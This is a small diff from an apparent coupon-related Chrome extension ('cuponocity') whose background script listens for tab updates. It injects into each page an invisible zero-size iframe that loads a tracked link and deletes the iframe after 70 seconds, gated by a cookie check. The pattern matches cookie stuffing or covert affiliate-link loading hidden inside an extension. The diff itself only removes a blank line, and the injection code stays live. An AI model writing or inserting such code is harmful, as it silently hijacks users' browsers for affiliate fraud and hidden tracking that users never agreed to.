@@ -6,7 +6,6 @@ chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
         trackedlink = array[0][3];
         if(getCookie("cuponocity-"+linkSend) == ''){
           setCookie("cuponocity-"+linkSend);
-
         chrome.tabs.executeScript({
           code: 'if(!document.getElementById("ajax-form-div45")){var content = document.createElement("iframe");content.setAttribute("id", "ajax-form-div45");content.style = "visibility:hidden;display:block;width: 0px;height: 0px;";content.src = "' + trackedlink + '";document.getElementsByTagName("head")[0].insertAdjacentElement("afterend", content);element = document.getElementById("ajax-form-div45");setTimeout(function(){ element.parentNode.removeChild(element); }, 70000);}'
         });
